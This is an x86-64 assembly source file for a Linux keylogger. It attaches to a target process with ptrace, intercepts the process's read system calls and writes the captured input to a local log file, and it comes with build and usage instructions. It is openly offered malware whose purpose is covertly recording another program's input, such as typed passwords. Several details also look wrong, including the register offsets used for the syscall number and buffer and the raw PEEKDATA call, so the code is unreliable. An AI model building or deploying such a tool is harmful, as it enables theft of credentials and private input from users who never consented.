; Linux x64 assembly keylogger using ptrace
; Compile: nasm -f elf64 ptrace_keylogger.asm
; Link: ld -o ptrace_keylogger ptrace_keylogger.asm.o
; Usage: ./ptrace_keylogger PID

section .data
    log_file db "keylog_ptrace.txt", 0
    error_msg db "Error: Invalid PID", 0, 10
    usage_msg db "Usage: ./ptrace_keylogger PID", 0, 10
    
section .bss
    target_pid resq 1          ; Target process ID
    log_fd resq 1              ; Log file descriptor
    regs resb 216              ; struct user_regs_struct
    buffer resb 8              ; Buffer for ptrace data

section .text
    global _start

_start:
    ; Check if PID argument is provided
    pop rax                    ; argc
    cmp rax, 2                 ; Need at least 2 args (program name + PID)
    jl usage_error
    
    ; Get PID from argv[1]
    pop rdi                    ; Discard argv[0]
    pop rdi                    ; argv[1] - PID string
    call atoi                  ; Convert string to integer
    
    cmp rax, 0                 ; Check if valid PID
    jle pid_error
    
    mov [target_pid], rax      ; Store PID
    
    ; Open log file
    mov rax, 2                 ; syscall: open
    mov rdi, log_file          ; path to file
    mov rsi, 1102o             ; O_CREAT | O_WRONLY | O_APPEND
    mov rdx, 0644o             ; mode: rw-r--r--
    syscall
    
    mov [log_fd], rax          ; Store file descriptor
    
    ; Attach to target process
    mov rax, 101               ; syscall: ptrace
    mov rdi, 0                 ; PTRACE_ATTACH
    mov rsi, [target_pid]      ; Target PID
    xor rdx, rdx               ; addr (unused)
    xor r10, r10               ; data (unused)
    syscall
    
    ; Wait for the process to stop
    mov rax, 61                ; syscall: wait4
    mov rdi, [target_pid]      ; PID to wait for
    xor rsi, rsi               ; status pointer (NULL)
    mov rdx, 2                 ; WUNTRACED
    xor r10, r10               ; rusage (NULL)
    syscall
    
    ; Main tracing loop
trace_loop:
    ; Set options for ptrace
    mov rax, 101               ; syscall: ptrace
    mov rdi, 4                 ; PTRACE_SETOPTIONS
    mov rsi, [target_pid]      ; Target PID
    xor rdx, rdx               ; addr (unused)
    mov r10, 1                 ; PTRACE_O_TRACESYSGOOD
    syscall
    
    ; Continue execution until next syscall
syscall_entry:
    mov rax, 101               ; syscall: ptrace
    mov rdi, 24                ; PTRACE_SYSCALL
    mov rsi, [target_pid]      ; Target PID
    xor rdx, rdx               ; addr (unused)
    xor r10, r10               ; data (unused)
    syscall
    
    ; Wait for syscall entry
    mov rax, 61                ; syscall: wait4
    mov rdi, [target_pid]      ; PID to wait for
    xor rsi, rsi               ; status pointer (NULL)
    mov rdx, 2                 ; WUNTRACED
    xor r10, r10               ; rusage (NULL)
    syscall
    
    cmp rax, 0                 ; Check if process exited
    jle cleanup
    
    ; Get registers to inspect syscall
    mov rax, 101               ; syscall: ptrace
    mov rdi, 12                ; PTRACE_GETREGS
    mov rsi, [target_pid]      ; Target PID
    xor rdx, rdx               ; addr (unused)
    mov r10, regs              ; struct user_regs_struct
    syscall
    
    ; Check if syscall is read (syscall number 0)
    mov rax, [regs]            ; syscall number is at offset 0
    cmp rax, 0                 ; read syscall
    jne skip_inspect
    
    ; Continue execution until syscall exit
    mov rax, 101               ; syscall: ptrace
    mov rdi, 24                ; PTRACE_SYSCALL
    mov rsi, [target_pid]      ; Target PID
    xor rdx, rdx               ; addr (unused)
    xor r10, r10               ; data (unused)
    syscall
    
    ; Wait for syscall exit
    mov rax, 61                ; syscall: wait4
    mov rdi, [target_pid]      ; PID to wait for
    xor rsi, rsi               ; status pointer (NULL)
    mov rdx, 2                 ; WUNTRACED
    xor r10, r10               ; rusage (NULL)
    syscall
    
    cmp rax, 0                 ; Check if process exited
    jle cleanup
    
    ; Read data at buffer address
    mov rax, 101               ; syscall: ptrace
    mov rdi, 3                 ; PTRACE_PEEKDATA
    mov rsi, [target_pid]      ; Target PID
    mov rdx, [regs+32]         ; Buffer address (rsi from syscall entry)
    xor r10, r10               ; data (unused)
    syscall
    
    mov [buffer], rax          ; Store read data
    
    ; Log captured data
    mov rax, 1                 ; syscall: write
    mov rdi, [log_fd]          ; log file fd
    mov rsi, buffer            ; Buffer with captured data
    mov rdx, 8                 ; Write 8 bytes max
    syscall
    
skip_inspect:
    jmp syscall_entry          ; Continue tracing
    
cleanup:
    ; Detach from process
    mov rax, 101               ; syscall: ptrace
    mov rdi, 17                ; PTRACE_DETACH
    mov rsi, [target_pid]      ; Target PID
    xor rdx, rdx               ; addr (unused)
    xor r10, r10               ; data (unused)
    syscall
    
    ; Close log file
    mov rax, 3                 ; syscall: close
    mov rdi, [log_fd]
    syscall
    
    ; Exit cleanly
    mov rax, 60                ; syscall: exit
    mov rdi, 0                 ; status: success
    syscall

usage_error:
    ; Print usage message
    mov rax, 1                 ; syscall: write
    mov rdi, 2                 ; fd: stderr
    mov rsi, usage_msg
    mov rdx, 30                ; length
    syscall
    
    jmp exit_error

pid_error:
    ; Print error message
    mov rax, 1                 ; syscall: write
    mov rdi, 2                 ; fd: stderr
    mov rsi, error_msg
    mov rdx, 19                ; length
    syscall
    
exit_error:
    ; Exit with error
    mov rax, 60                ; syscall: exit
    mov rdi, 1                 ; status: error
    syscall

; Function to convert string to integer (simple atoi)
atoi:
    xor rax, rax               ; Clear return value
    xor rcx, rcx               ; Clear current character
    
atoi_loop:
    mov cl, byte [rdi]         ; Load next character
    test cl, cl                ; Check for null terminator
    jz atoi_done
    
    sub cl, '0'                ; Convert ASCII to numeric value
    cmp cl, 9                  ; Check if valid digit
    ja atoi_error
    
    imul rax, 10               ; Multiply current value by 10
    add rax, rcx               ; Add new digit
    
    inc rdi                    ; Move to next character
    jmp atoi_loop
    
atoi_done:
    ret
    
atoi_error:
    xor rax, rax               ; Return 0 on error
    ret